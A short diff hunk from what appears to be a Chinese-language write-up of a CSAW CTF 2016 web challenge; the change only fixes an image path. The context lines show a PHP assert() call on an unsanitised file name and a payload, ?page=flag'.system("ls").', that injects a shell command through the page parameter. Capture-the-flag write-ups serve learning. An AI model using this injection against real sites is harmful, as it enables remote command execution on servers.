@@ -40,7 +40,7 @@ assert("file_exists('$file')") or die("That file doesn't exist!");
 
 查看目录：?page=flag'.system("ls").'
 
-![image]
+![image]Writeup-of-web-of-csaw-ctf-2016-quals/images/1.png
 
 
 
